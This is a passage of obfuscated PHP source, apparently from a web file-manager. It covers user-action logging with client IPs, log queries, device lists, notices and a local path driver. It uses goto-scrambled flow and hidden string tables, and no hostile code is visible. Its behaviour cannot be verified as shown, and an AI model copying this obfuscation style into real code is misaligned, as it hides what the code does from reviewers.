$a•”Ô…«¸[1646] => LNG($a•”Ô…«¸[2006]), $a•”Ô…«¸[2007] => LNG($a•”Ô…«¸[2008]), $a•”Ô…«¸[2009] => LNG($a•”Ô…«¸[2010]), $a•”Ô…«¸[2011] => LNG($a•”Ô…«¸[2012]), $a•”Ô…«¸[2013] => LNG($a•”Ô…«¸[2014]), $a•”Ô…«¸[1649] => LNG($a•”Ô…«¸[2015]), $a•”Ô…«¸[1650] => LNG($a•”Ô…«¸[2016]), $a•”Ô…«¸[2017] => LNG($a•”Ô…«¸[2018]), $a•”Ô…«¸[2019] => LNG($a•”Ô…«¸[2020]), $a•”Ô…«¸[2021] => LNG($a•”Ô…«¸[2022]), $a•”Ô…«¸[1644] => LNG($a•”Ô…«¸[2023]), $a•”Ô…«¸[2024] => LNG($a•”Ô…«¸[2025]), $a•”Ô…«¸[1643] => LNG($a•”Ô…«¸[2026]), $a•”Ô…«¸[2027] => LNG($a•”Ô…«¸[2028]), $a•”Ô…«¸[2029] => LNG($a•”Ô…«¸[2030]), $a•”Ô…«¸[2031] => LNG($a•”Ô…«¸[2032]), $a•”Ô…«¸[2033] => LNG($a•”Ô…«¸[2033]), $a•”Ô…«¸[2034] => LNG($a•”Ô…«¸[1615]), $a•”Ô…«¸[2035] => LNG($a•”Ô…«¸[2036]), $a•”Ô…«¸[2037] => LNG($a•”Ô…«¸[2038]), $a•”Ô…«¸[2039] => LNG($a•”Ô…«¸[2040]), $a•”Ô…«¸[2041] => LNG($a•”Ô…«¸[2042]), $a•”Ô…«¸[2043] => LNG($a•”Ô…«¸[2044]), $a•”Ô…«¸[2045] => LNG($a•”Ô…«¸[2045]), $a•”Ô…«¸[2046] => LNG($a•”Ô…«¸[2047]), $a•”Ô…«¸[2048] => LNG($a•”Ô…«¸[2049]), $a•”Ô…«¸[2050] => LNG($a•”Ô…«¸[2051]), $a•”Ô…«¸[2052] => LNG($a•”Ô…«¸[2053]), $a•”Ô…«¸[2054] => LNG($a•”Ô…«¸[2055]), $a•”Ô…«¸[2056] => LNG($a•”Ô…«¸[2057])); } private function typeFile() { $cŒÅÃ£ãéù =& $_SERVER[Ïº«‚ßèÔˆø]; $Eä†°¢Ïè­ = array($cŒÅÃ£ãéù[1646] => array($cŒÅÃ£ãéù[1647]), $cŒÅÃ£ãéù[2001] => array($cŒÅÃ£ãéù[2058]), $cŒÅÃ£ãéù[2003] => array($cŒÅÃ£ãéù[2059]), $cŒÅÃ£ãéù[1639] => array($cŒÅÃ£ãéù[1640]), $cŒÅÃ£ãéù[2009] => array(), $cŒÅÃ£ãéù[2011] => array(), $cŒÅÃ£ãéù[2013] => array(), $cŒÅÃ£ãéù[1649] => array($cŒÅÃ£ãéù[1651]), $cŒÅÃ£ãéù[1650] => array($cŒÅÃ£ãéù[1651]), $cŒÅÃ£ãéù[2017] => array($cŒÅÃ£ãéù[2060]), $cŒÅÃ£ãéù[2019] => array($cŒÅÃ£ãéù[2060]), $cŒÅÃ£ãéù[2021] => array($cŒÅÃ£ãéù[2061]), $cŒÅÃ£ãéù[2007] => array($cŒÅÃ£ãéù[2062]), $cŒÅÃ£ãéù[1644] => array($cŒÅÃ£ãéù[2063]), $cŒÅÃ£ãéù[2024] => array($cŒÅÃ£ãéù[2064]), $cŒÅÃ£ãéù[1643] => array($cŒÅÃ£ãéù[1645])); return $Eä†°¢Ïè­; } private function typeAll() { goto E¥ùµÙ˜¦•; e”®÷ê¼«: return $e‹Íùö½—¼; goto B ¬®ª¨‰; b˜«“ŠÂ«†: foreach ($b¾¯¬ª¨Ã´ as $dõ¢Óòß¸ => $cìé¾Áõ®à) { $e‹Íùö½—¼[$cìé¾Áõ®à[0]] = $e‹Íùö½—¼[$dõ¢Óòß¸]; } $e‹Íùö½—¼[$a²Ù¸…Î[1651]] = LNG($a²Ù¸…Î[2065]); $e‹Íùö½—¼[$a²Ù¸…Î[2060]] = LNG($a²Ù¸…Î[2066]); goto e”®÷ê¼«; E¥ùµÙ˜¦•: $a²Ù¸…Î =& $_SERVER[Ïº«‚ßèÔˆø]; $e‹Íùö½—¼ = $this->typeList; $b¾¯¬ª¨Ã´ = array_filter($this->typeFile()); goto b˜«“ŠÂ«†; B ¬®ª¨‰: } public function addLog($FŞ’™æ¿½…, $c«¿ñÕĞ‚ñ = array()) { goto E×›ÎòˆòÒ; E×›ÎòˆòÒ: $A˜„š†´ÇÑ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!isset($this->typeList[$FŞ’™æ¿½…])) { return; } $BåáÅ = defined($A˜„š†´ÇÑ[452]) && USER_ID ? USER_ID : (isset($c«¿ñÕĞ‚ñ[$A˜„š†´ÇÑ[1508]]) ? $c«¿ñÕĞ‚ñ[$A˜„š†´ÇÑ[1508]] : 0); goto CÇ‹ˆ §÷¤; dÈÚ¥Åà†‡: $c«¿ñÕĞ‚ñ = array($A˜„š†´ÇÑ[1499] => Session::sign(), $A˜„š†´ÇÑ[1500] => $BåáÅ, $A˜„š†´ÇÑ[29] => $FŞ’™æ¿½…, $A˜„š†´ÇÑ[1502] => json_encode($c«¿ñÕĞ‚ñ)); parent::add($c«¿ñÕĞ‚ñ); goto d†²´ŒéÌ; CÇ‹ˆ §÷¤: if (!$BåáÅ) { $BåáÅ = (int) Session::get($A˜„š†´ÇÑ[1797]); } $E¤èÕ²“î = get_client_ip(); if (!$c«¿ñÕĞ‚ñ || strlen(json_encode($c«¿ñÕĞ‚ñ)) >= 1024) { $c«¿ñÕĞ‚ñ = array($A˜„š†´ÇÑ[2067] => $E¤èÕ²“î); } else { if (is_array($c«¿ñÕĞ‚ñ)) { $c«¿ñÕĞ‚ñ[$A˜„š†´ÇÑ[2067]] = $E¤èÕ²“î; } else { $c«¿ñÕĞ‚ñ = array($A˜„š†´ÇÑ[1071] => $c«¿ñÕĞ‚ñ, $A˜„š†´ÇÑ[2067] => $E¤èÕ²“î); } } goto dÈÚ¥Åà†‡; d†²´ŒéÌ: } public function remove($cÀÛ‘Îê¹†) { $this->where(array($_SERVER[Ïº«‚ßèÔˆø][410] => $cÀÛ‘Îê¹†))->delete(); } private function _makeOrder($cïÈ†·†™ = '') { goto Dïäâï¹; B–Ğ§Õæ¡: return $this->order($cïÈ†·†™); goto F¨Ôæ‰æ¡; Dïäâï¹: $D£ÀÑÃ¢Ä =& $_SERVER[Ïº«‚ßèÔˆø]; $Cİíä‘ËÙ¹ = $D£ÀÑÃ¢Ä[193]; $c¤˜°¦ÍŞã = array($D£ÀÑÃ¢Ä[426] => $D£ÀÑÃ¢Ä[427], $D£ÀÑÃ¢Ä[428] => $D£ÀÑÃ¢Ä[429]); goto c‘Ì†òÏÉ; c‘Ì†òÏÉ: $DÂ§àæ§§¾ = Input::get($D£ÀÑÃ¢Ä[434], $D£ÀÑÃ¢Ä[7], $D£ÀÑÃ¢Ä[1829], array($D£ÀÑÃ¢Ä[1753], $D£ÀÑÃ¢Ä[428])); $DÂ§àæ§§¾ = $c¤˜°¦ÍŞã[$DÂ§àæ§§¾]; $cïÈ†·†™ = $cïÈ†·†™ . "{$Cİíä‘ËÙ¹}\40{$DÂ§àæ§§¾}"; goto B–Ğ§Õæ¡; F¨Ôæ‰æ¡: } public function get($f±°‚—Ø‡ = '') { goto e©Â¸ÑƒÔ£; cõ°ìß·Á¾: if (!empty($f±°‚—Ø‡[$CÏ«ÃÌËÄá[2067]])) { $B¾¿¦¨ìÃ[$CÏ«ÃÌËÄá[429]] = array($CÏ«ÃÌËÄá[379], "\x25{$f±°‚—Ø‡[$CÏ«ÃÌËÄá[2067]]}\45"); } $f³‘ÜŸ—Ù = $this->_makeOrder()->where($B¾¿¦¨ìÃ)->selectPage(); if (empty($f³‘ÜŸ—Ù[$CÏ«ÃÌËÄá[366]])) { show_json(array(), !0, $f³‘ÜŸ—Ù[$CÏ«ÃÌËÄá[363]]); } goto d§¡ĞÙÈÎ”; d§¡ĞÙÈÎ”: $f³‘ÜŸ—Ù[$CÏ«ÃÌËÄá[366]] = $this->logList($f³‘ÜŸ—Ù[$CÏ«ÃÌËÄá[366]]); return $f³‘ÜŸ—Ù; goto BÆâ¸š¡íá; e©Â¸ÑƒÔ£: $CÏ«ÃÌËÄá =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$f±°‚—Ø‡) { show_json(array()); } $B¾¿¦¨ìÃ = array(); goto AÈÖò‰ÖÎ’; AÈÖò‰ÖÎ’: if ($f±°‚—Ø‡[$CÏ«ÃÌËÄá[1508]]) { $B¾¿¦¨ìÃ[$CÏ«ÃÌËÄá[1508]] = $f±°‚—Ø‡[$CÏ«ÃÌËÄá[1508]]; } if (isset($f±°‚—Ø‡[$CÏ«ÃÌËÄá[705]])) { $e¾Ø­½Ï‹ = $f±°‚—Ø‡[$CÏ«ÃÌËÄá[705]]; $Cªà‰œÃÁ¸ = isset($f±°‚—Ø‡[$CÏ«ÃÌËÄá[474]]) ? $f±°‚—Ø‡[$CÏ«ÃÌËÄá[474]] : time(); $B¾¿¦¨ìÃ[$CÏ«ÃÌËÄá[193]] = array($CÏ«ÃÌËÄá[330], array($e¾Ø­½Ï‹, $Cªà‰œÃÁ¸)); } if ($f±°‚—Ø‡[$CÏ«ÃÌËÄá[29]]) { $Bçéˆ Õ­ß = explode($CÏ«ÃÌËÄá[47], $f±°‚—Ø‡[$CÏ«ÃÌËÄá[29]]); $e×‡áªŒğ„ = $this->typeFile(); $c‡ô…’å¢• = array(); foreach ($Bçéˆ Õ­ß as $EÉ²±¤œ‡˜) { $c‡ô…’å¢•[] = $EÉ²±¤œ‡˜; if (isset($e×‡áªŒğ„[$EÉ²±¤œ‡˜])) { $c‡ô…’å¢• = array_merge($c‡ô…’å¢•, $e×‡áªŒğ„[$EÉ²±¤œ‡˜]); } } $c‡ô…’å¢• = array_unique($c‡ô…’å¢•); if ($c‡ô…’å¢•) { $B¾¿¦¨ìÃ[$CÏ«ÃÌËÄá[29]] = array($CÏ«ÃÌËÄá[7], $c‡ô…’å¢•); } } else { $B¾¿¦¨ìÃ[$CÏ«ÃÌËÄá[29]] = array($CÏ«ÃÌËÄá[2068], $CÏ«ÃÌËÄá[2069]); } goto cõ°ìß·Á¾; BÆâ¸š¡íá: } private function ipAddress(&$dêâí–†ˆ) { $a·ŠÁËÒÅŠ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!empty($dêâí–†ˆ[$a·ŠÁËÒÅŠ[2067]])) { $Eİƒåºî…© = IpLocation::get($dêâí–†ˆ[$a·ŠÁËÒÅŠ[2067]]); } else { $Eİƒåºî…© = LNG($a·ŠÁËÒÅŠ[2070]); } $dêâí–†ˆ[$a·ŠÁËÒÅŠ[2071]] = $Eİƒåºî…©; } private function descZipDownload($b‚‡â•¡ÚË, &$AšĞòÑÇÍ×) { $f‡â†Õ›¹Æ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!isset($b‚‡â•¡ÚË[$f‡â†Õ›¹Æ[2072]])) { return; } $B« ª•õ¬Š = json_decode($b‚‡â•¡ÚË[$f‡â†Õ›¹Æ[2072]], !0); foreach ($B« ª•õ¬Š as $eÆ‘¦®‡·¢) { try { $Bá–à‰½†Ë = IO::infoFull($eÆ‘¦®‡·¢[$f‡â†Õ›¹Æ[76]]); } catch (Exception $bˆ©ö»¦Àø) { continue; } $b‚‡â•¡ÚË[$f‡â†Õ›¹Æ[76]] = $eÆ‘¦®‡·¢[$f‡â†Õ›¹Æ[76]]; $AšĞòÑÇÍ×[] = $b‚‡â•¡ÚË[$f‡â†Õ›¹Æ[394]] = $Bá–à‰½†Ë[$f‡â†Õ›¹Æ[394]]; $AšĞòÑÇÍ×[] = $b‚‡â•¡ÚË[$f‡â†Õ›¹Æ[1885]] = $Bá–à‰½†Ë[$f‡â†Õ›¹Æ[476]]; break; } return $b‚‡â•¡ÚË; } private function getSourceList(&$DÇà‰¤ÁŠÄ) { $c¦ªëô†¯ =& $_SERVER[Ïº«‚ßèÔˆø]; $b“â¢²•ÌÃ = array(); foreach ($DÇà‰¤ÁŠÄ as $b‚µ¶ÌŞÑ => $DèÇòõ†Í) { goto e›Íê¬Ëùñ; e›Íê¬Ëùñ: $b­©˜Ğ­Öô = json_decode($DèÇòõ†Í[$c¦ªëô†¯[429]], !0); if ($DèÇòõ†Í[$c¦ªëô†¯[29]] == $c¦ªëô†¯[1642]) { $b­©˜Ğ­Öô = $this->descZipDownload($b­©˜Ğ­Öô, $b“â¢²•ÌÃ); $DÇà‰¤ÁŠÄ[$b‚µ¶ÌŞÑ][$c¦ªëô†¯[429]] = json_encode($b­©˜Ğ­Öô); continue; } if (strpos($DèÇòõ†Í[$c¦ªëô†¯[29]], $c¦ªëô†¯[1886]) !== 0) { if (!isset($b­©˜Ğ­Öô[$c¦ªëô†¯[76]]) || strpos($DèÇòõ†Í[$c¦ªëô†¯[29]], $c¦ªëô†¯[2073]) !== 0) { continue; } try { $a…ÒÄ¿‚‚ù = IO::infoFull($b­©˜Ğ­Öô[$c¦ªëô†¯[76]]); } catch (Exception $A”ëµÓØáŠ) { continue; } $b“â¢²•ÌÃ[] = $b­©˜Ğ­Öô[$c¦ªëô†¯[394]] = $a…ÒÄ¿‚‚ù[$c¦ªëô†¯[394]]; $b“â¢²•ÌÃ[] = $b­©˜Ğ­Öô[$c¦ªëô†¯[1885]] = $a…ÒÄ¿‚‚ù[$c¦ªëô†¯[476]]; $DÇà‰¤ÁŠÄ[$b‚µ¶ÌŞÑ][$c¦ªëô†¯[429]] = json_encode($b­©˜Ğ­Öô); continue; } goto CáÃ„Ç¤»™; CáÃ„Ç¤»™: $b“â¢²•ÌÃ[] = $b­©˜Ğ­Öô[$c¦ªëô†¯[394]]; $b“â¢²•ÌÃ[] = $b­©˜Ğ­Öô[$c¦ªëô†¯[1885]]; if ($b­©˜Ğ­Öô[$c¦ªëô†¯[29]] == $c¦ªëô†¯[519]) { $b“â¢²•ÌÃ[] = $b­©˜Ğ­Öô[$c¦ªëô†¯[429]][$c¦ªëô†¯[1038]]; $b“â¢²•ÌÃ[] = $b­©˜Ğ­Öô[$c¦ªëô†¯[429]][$c¦ªëô†¯[1039]]; } goto B´–•ÂÁ¤Ë; B´–•ÂÁ¤Ë: if ($b­©˜Ğ­Öô[$c¦ªëô†¯[29]] == $c¦ªëô†¯[1893]) { $b“â¢²•ÌÃ[] = $b­©˜Ğ­Öô[$c¦ªëô†¯[429]][$c¦ªëô†¯[394]]; } goto a‚ğÅ†Ş·”; a‚ğÅ†Ş·”: } if (!$b“â¢²•ÌÃ) { return array(); } return Model($c¦ªëô†¯[782])->sourceListInfo($b“â¢²•ÌÃ, !0); } private function logList($Cƒ¢ò°‡¶¦) { goto cÅ§„†¼³; FŠĞ¢ÃŞ•˜: $E¯ø´ÕÎ¶Ë = array(); foreach ($Cƒ¢ò°‡¶¦ as $FØÌÃ“Ï => $C˜åÒ÷œàº) { goto a¿ö–Œß™; B™…„Ç‰–è: $C˜åÒ÷œàº[$F˜øÜÊÎ×‰[1828]] = $Eõ¸¶†ó¬†; $CˆµÑåœÇ = json_decode($C˜åÒ÷œàº[$F˜øÜÊÎ×‰[429]], !0); $C˜åÒ÷œàº[$F˜øÜÊÎ×‰[2067]] = isset($CˆµÑåœÇ[$F˜øÜÊÎ×‰[2067]]) ? $CˆµÑåœÇ[$F˜øÜÊÎ×‰[2067]] : $F˜øÜÊÎ×‰[33]; goto Bš¶Šœ‹¿; a¿ö–Œß™: $e÷³¹øò Ş = $C˜åÒ÷œàº[$F˜øÜÊÎ×‰[29]]; $Eõ¸¶†ó¬† = isset($D“–©ˆš[$C˜åÒ÷œàº[$F˜øÜÊÎ×‰[1508]]]) ? $D“–©ˆš[$C˜åÒ÷œàº[$F˜øÜÊÎ×‰[1508]]] : !1; $cÍ“¯ŠÙÕà = strpos($e÷³¹øò Ş, $F˜øÜÊÎ×‰[2074]) === 0 ? LNG($F˜øÜÊÎ×‰[2075]) : LNG($F˜øÜÊÎ×‰[2070]); goto bÜ‘ÄÕ º; Bš¶Šœ‹¿: $this->ipAddress($C˜åÒ÷œàº); if (strpos($e÷³¹øò Ş, $F˜øÜÊÎ×‰[1886]) === 0 || isset($CˆµÑåœÇ[$F˜øÜÊÎ×‰[1885]])) { goto b½ÆˆÖğõâ; b½ÆˆÖğõâ: $CˆµÑåœÇ[$F˜øÜÊÎ×‰[85]] = $e¨ÆñŸºÆó[$CˆµÑåœÇ[$F˜øÜÊÎ×‰[394]]]; $CˆµÑåœÇ[$F˜øÜÊÎ×‰[1898]] = $e¨ÆñŸºÆó[$CˆµÑåœÇ[$F˜øÜÊÎ×‰[1885]]]; if ($CˆµÑåœÇ[$F˜øÜÊÎ×‰[29]] == $F˜øÜÊÎ×‰[519]) { $CˆµÑåœÇ[$F˜øÜÊÎ×‰[429]][$F˜øÜÊÎ×‰[1038]] = $e¨ÆñŸºÆó[$CˆµÑåœÇ[$F˜øÜÊÎ×‰[429]][$F˜øÜÊÎ×‰[1038]]]; $CˆµÑåœÇ[$F˜øÜÊÎ×‰[429]][$F˜øÜÊÎ×‰[1039]] = $e¨ÆñŸºÆó[$CˆµÑåœÇ[$F˜øÜÊÎ×‰[429]][$F˜øÜÊÎ×‰[1039]]]; } goto F©Ç­Ú; AŒô“‚¶÷: if ($CˆµÑåœÇ[$F˜øÜÊÎ×‰[1898]] && $CˆµÑåœÇ[$F˜øÜÊÎ×‰[1898]][$F˜øÜÊÎ×‰[402]] == $F˜øÜÊÎ×‰[1152]) { $E¯ø´ÕÎ¶Ë[] = $C˜åÒ÷œàº[$F˜øÜÊÎ×‰[392]]; unset($Cƒ¢ò°‡¶¦[$FØÌÃ“Ï]); continue; } goto DäØª›£Üª; F©Ç­Ú: if ($CˆµÑåœÇ[$F˜øÜÊÎ×‰[29]] == $F˜øÜÊÎ×‰[1893]) { $CˆµÑåœÇ[$F˜øÜÊÎ×‰[429]][$F˜øÜÊÎ×‰[394]] = $e¨ÆñŸºÆó[$CˆµÑåœÇ[$F˜øÜÊÎ×‰[429]][$F˜øÜÊÎ×‰[394]]]; } if ($CˆµÑåœÇ[$F˜øÜÊÎ×‰[29]] == $F˜øÜÊÎ×‰[1637]) { $CˆµÑåœÇ[$F˜øÜÊÎ×‰[1898]] = $CˆµÑåœÇ[$F˜øÜÊÎ×‰[85]]; $CˆµÑåœÇ[$F˜øÜÊÎ×‰[1885]] = $CˆµÑåœÇ[$F˜øÜÊÎ×‰[1898]][$F˜øÜÊÎ×‰[394]]; $CˆµÑåœÇ[$F˜øÜÊÎ×‰[85]] = !1; $CˆµÑåœÇ[$F˜øÜÊÎ×‰[394]] = $F˜øÜÊÎ×‰[33]; } if ($CˆµÑåœÇ[$F˜øÜÊÎ×‰[85]] && $CˆµÑåœÇ[$F˜øÜÊÎ×‰[85]][$F˜øÜÊÎ×‰[402]] == $F˜øÜÊÎ×‰[1152]) { $E¯ø´ÕÎ¶Ë[] = $C˜åÒ÷œàº[$F˜øÜÊÎ×‰[392]]; unset($Cƒ¢ò°‡¶¦[$FØÌÃ“Ï]); continue; } goto AŒô“‚¶÷; DäØª›£Üª: } $C˜åÒ÷œàº[$F˜øÜÊÎ×‰[429]] = $CˆµÑåœÇ; goto d”¶Ğ¢ß³„; bÜ‘ÄÕ º: $C˜åÒ÷œàº[$F˜øÜÊÎ×‰[28]] = isset($Eõ¸¶†ó¬†[$F˜øÜÊÎ×‰[28]]) ? $Eõ¸¶†ó¬†[$F˜øÜÊÎ×‰[28]] : LNG($F˜øÜÊÎ×‰[2070]); $C˜åÒ÷œàº[$F˜øÜÊÎ×‰[1935]] = isset($Eõ¸¶†ó¬†[$F˜øÜÊÎ×‰[1935]]) ? $Eõ¸¶†ó¬†[$F˜øÜÊÎ×‰[1935]] : $F˜øÜÊÎ×‰[33]; $C˜åÒ÷œàº[$F˜øÜÊÎ×‰[1414]] = isset($EÏÜ®ğŒ°Œ[$e÷³¹øò Ş]) ? $EÏÜ®ğŒ°Œ[$e÷³¹øò Ş] : $cÍ“¯ŠÙÕà; goto B™…„Ç‰–è; d”¶Ğ¢ß³„: unset($C˜åÒ÷œàº[$F˜øÜÊÎ×‰[2076]]); $a…½œ„÷[] = $C˜åÒ÷œàº; goto fÜ™ªâğ–å; fÜ™ªâğ–å: } $this->clearSystemPathLog($E¯ø´ÕÎ¶Ë); goto b§Ú†ŒÑ´¬; cÅ§„†¼³: $F˜øÜÊÎ×‰ =& $_SERVER[Ïº«‚ßèÔˆø]; $B‚„ÎÜ™¿ = array_to_keyvalue($Cƒ¢ò°‡¶¦, $F˜øÜÊÎ×‰[33], $F˜øÜÊÎ×‰[1508]); $D“–©ˆš = Model($F˜øÜÊÎ×‰[505])->userListInfo(array_unique($B‚„ÎÜ™¿)); goto D½Àá•´¨”; b§Ú†ŒÑ´¬: return $a…½œ„÷; goto Cİî¦©òçÆ; D½Àá•´¨”: $e¨ÆñŸºÆó = $this->getSourceList($Cƒ¢ò°‡¶¦); $EÏÜ®ğŒ°Œ = $this->typeAll(); $a…½œ„÷ = array(); goto FŠĞ¢ÃŞ•˜; Cİî¦©òçÆ: } private function clearSystemPathLog($aìøîí¹’ô) { $DÒÚ„ˆ ®õ =& $_SERVER[Ïº«‚ßèÔˆø]; if (count($aìøîí¹’ô) == 0) { return; } $C”ŸøâĞ© = array($DÒÚ„ˆ ®õ[392] => array($DÒÚ„ˆ ®õ[7], array_unique($aìøîí¹’ô))); $this->where($C”ŸøâĞ©)->delete(); } public function deviceList($A‹Æò‡¼‚¸, $DÚµ°†³Ä‚ = 0) { $b†Ÿ’µ¾® =& $_SERVER[Ïº«‚ßèÔˆø]; $fÜ‚Ñ×µÇ = array($b†Ÿ’µ¾®[1508] => $A‹Æò‡¼‚¸, $b†Ÿ’µ¾®[193] => array($b†Ÿ’µ¾®[955], $DÚµ°†³Ä‚), $b†Ÿ’µ¾®[29] => $b†Ÿ’µ¾®[1611]); $A«¶‰ïºĞĞ = array(); $fâËÎ“í¢ô = $this->field($b†Ÿ’µ¾®[2077])->where($fÜ‚Ñ×µÇ)->order($b†Ÿ’µ¾®[1896])->limit(50)->select(); foreach ($fâËÎ“í¢ô as $fÆÖ¤œƒº => $CÉ²â™ò¢Æ) { goto BÛƒ¤œÂò; BÛƒ¤œÂò: if ($fÆÖ¤œƒº > 0 && abs($CÉ²â™ò¢Æ[$b†Ÿ’µ¾®[193]] - $fâËÎ“í¢ô[$fÆÖ¤œƒº - 1][$b†Ÿ’µ¾®[193]]) < 5) { continue; } $F»Ûç‹ŠÙ‘ = json_decode($CÉ²â™ò¢Æ[$b†Ÿ’µ¾®[429]], !0); $CÉ²â™ò¢Æ[$b†Ÿ’µ¾®[2067]] = isset($F»Ûç‹ŠÙ‘[$b†Ÿ’µ¾®[2067]]) ? $F»Ûç‹ŠÙ‘[$b†Ÿ’µ¾®[2067]] : $b†Ÿ’µ¾®[33]; goto e»ÑŠÆ‹ŒÒ; c‘ÏÒÌàµº: $this->ipAddress($CÉ²â™ò¢Æ); $CÉ²â™ò¢Æ[$b†Ÿ’µ¾®[429]] = $F»Ûç‹ŠÙ‘; $A«¶‰ïºĞĞ[$f¼ŠÛ˜âÃ÷] = $CÉ²â™ò¢Æ; goto c‚œÉ–ï±¯; e»ÑŠÆ‹ŒÒ: unset($F»Ûç‹ŠÙ‘[$b†Ÿ’µ¾®[2067]]); $f¼ŠÛ˜âÃ÷ = $this->deviceType($F»Ûç‹ŠÙ‘[$b†Ÿ’µ¾®[1887]]); if (isset($A«¶‰ïºĞĞ[$f¼ŠÛ˜âÃ÷])) { continue; } goto c‘ÏÒÌàµº; c‚œÉ–ï±¯: } return array_values($A«¶‰ïºĞĞ); } public function deviceType($døÙ«ñ„ÏÜ) { return $døÙ«ñ„ÏÜ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\56\x6e\x6f\164\x69\143\x65\x4c\x69\x73\x74"; public $field = array("\156\x61\x6d\145", "\143\157\156\x74\145\x6e\164", "\x61\x75\164\150", "\x6d\x6f\144\145", "\164\x69\x6d\145", "\x74\171\160\145", "\154\x65\166\x65\x6c", "\145\156\141\142\154\x65", "\x73\157\162\164"); public function listData($A›Š Ûó‰Ê = false, $eóÊïäŸ¶› = "\163\x6f\x72\x74", $EÄŒó©ÖĞÓ = false) { return parent::listData($A›Š Ûó‰Ê, $eóÊïäŸ¶›, $EÄŒó©ÖĞÓ); } public function add($aä§ö½Åù«) { $DáÈ†º =& $_SERVER[Ïº«‚ßèÔˆø]; $D’óá”£š‘ = time(); if ($aä§ö½Åù«[$DáÈ†º[12]] == $DáÈ†º[2078]) { $D’óá”£š‘ = strtotime($aä§ö½Åù«[$DáÈ†º[196]]); } $aä§ö½Åù«[$DáÈ†º[196]] = $D’óá”£š‘; return parent::insert($aä§ö½Åù«); } public function update($AÜƒƒŒõğ, $dŒÂÁÕˆ·÷) { goto Dæµ¾Ô—ˆ; fŠ·š†Ï°¥: return parent::update($AÜƒƒŒõğ, $dŒÂÁÕˆ·÷); goto EĞÅŞĞ´ÔÄ; Dæµ¾Ô—ˆ: $Eì¬¢¯ =& $_SERVER[Ïº«‚ßèÔˆø]; $c¹ôÎó‰—„ = $this->listData($AÜƒƒŒõğ); if (!$c¹ôÎó‰—„) { return !1; } goto CïÊ˜ªÛğ; CïÊ˜ªÛğ: $DÇÌ¹ŠĞß = time(); if ($dŒÂÁÕˆ·÷[$Eì¬¢¯[12]] == $Eì¬¢¯[2078]) { $DÇÌ¹ŠĞß = strtotime($dŒÂÁÕˆ·÷[$Eì¬¢¯[196]]); } $dŒÂÁÕˆ·÷[$Eì¬¢¯[196]] = $DÇÌ¹ŠĞß; goto fŠ·š†Ï°¥; EĞÅŞĞ´ÔÄ: } public function remove($AŠÀÌõˆ¹) { $BèÓ÷ã¾ö¬ = $this->listData($AŠÀÌõˆ¹); if (!$BèÓ÷ã¾ö¬ || $BèÓ÷ã¾ö¬[$_SERVER[Ïº«‚ßèÔˆø][1152]]) { return !1; } return parent::remove($AŠÀÌõˆ¹); } public function sort($BğŒµœÁÊÙ, $aâ¿¬š±Æ¥) { return parent::update($BğŒµœÁÊÙ, $aâ¿¬š±Æ¥); } public function enable($aâ¾¬µ©ğ, $EÒ©ÕØåæœ) { return parent::update($aâ¾¬µ©ğ, array($_SERVER[Ïº«‚ßèÔˆø][2079] => $EÒ©ÕØåæœ)); } private function initUserOption() { $DÑ‰ŞÓÙèÕ =& $_SERVER[Ïº«‚ßèÔˆø]; $this->optionType = $DÑ‰ŞÓÙèÕ[2080]; $this->modelType = $DÑ‰ŞÓÙèÕ[2081]; $this->field = array($DÑ‰ŞÓÙèÕ[2082], $DÑ‰ŞÓÙèÕ[28], $DÑ‰ŞÓÙèÕ[196], $DÑ‰ŞÓÙèÕ[29], $DÑ‰ŞÓÙèÕ[2083], $DÑ‰ŞÓÙèÕ[697], $DÑ‰ŞÓÙèÕ[189]); } public function userNoticeGet($D³‰–¢Ñ™× = false) { $this->initUserOption(); return parent::listData($D³‰–¢Ñ™×, $_SERVER[Ïº«‚ßèÔˆø][392], !0); } public function userNoticeAdd($a¿œéš­ãò) { $CƒŒ”£Ï =& $_SERVER[Ïº«‚ßèÔˆø]; $this->initUserOption(); $F¸ÂÇË˜ì‡ = $this->findByKey($CƒŒ”£Ï[2082], $a¿œéš­ãò[$CƒŒ”£Ï[392]]); if ($F¸ÂÇË˜ì‡) { return !0; } $A‘¦Ò˜µÌ„ = array($CƒŒ”£Ï[2082] => $a¿œéš­ãò[$CƒŒ”£Ï[392]], $CƒŒ”£Ï[28] => $a¿œéš­ãò[$CƒŒ”£Ï[28]], $CƒŒ”£Ï[196] => $a¿œéš­ãò[$CƒŒ”£Ï[196]], $CƒŒ”£Ï[29] => isset($a¿œéš­ãò[$CƒŒ”£Ï[29]]) ? $a¿œéš­ãò[$CƒŒ”£Ï[29]] : 1, $CƒŒ”£Ï[2083] => isset($a¿œéš­ãò[$CƒŒ”£Ï[2083]]) ? $a¿œéš­ãò[$CƒŒ”£Ï[2083]] : 0, $CƒŒ”£Ï[697] => 0, $CƒŒ”£Ï[189] => 0); return parent::insert($A‘¦Ò˜µÌ„); } public function userNoticeEdit($böâŸ¨ëŠÎ, $Aéï›çÃ–˜) { $this->initUserOption(); return parent::update($böâŸ¨ëŠÎ, $Aéï›çÃ–˜); } } goto A™ÀÅ´›¾²; C¿ ¤É•šº: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($d‘‘©ä­¼›) { if (substr($d‘‘©ä­¼›, 0, 2) == $_SERVER[Ïº«‚ßèÔˆø][1226]) { $d‘‘©ä­¼› = BASIC_PATH . substr($d‘‘©ä­¼›, 2); } return $d‘‘©ä­¼›; } public function iconvApp($e–÷¸éÚˆá) { $Ešî µ÷Ú =& $_SERVER[Ïº«‚ßèÔˆø]; global $config; return $this->iconvTo($e–÷¸éÚˆá, $config[$Ešî µ÷Ú[1224]], $config[$Ešî µ÷Ú[1223]]); } public function iconvSystem($B¿İî‰ã‡‡) { $eîÆÄ³Åİ =& $_SERVER[Ïº«‚ßèÔˆø]; global $config; return $this->iconvTo($B¿İî‰ã‡‡, $config[$eîÆÄ³Åİ[1223]], $config[$eîÆÄ³Åİ[1224]]); } public function getPathOuter($A½ö‘İ‘) { goto E¶˜•Ú“Äì; E¶˜•Ú“Äì: $D¬ÅÆ’Æ² =& $_SERVER[Ïº«‚ßèÔˆø]; $F•ÑÔ²Æé = $this->iconvApp($this->pathBase); $A½ö‘İ‘ = $this->iconvApp($A½ö‘İ‘); goto B°®ÆÅÒ‚; B°®ÆÅÒ‚: if (substr($F•ÑÔ²Æé, 0, 2) == $D¬ÅÆ’Æ²[1226]) { $F•ÑÔ²Æé = 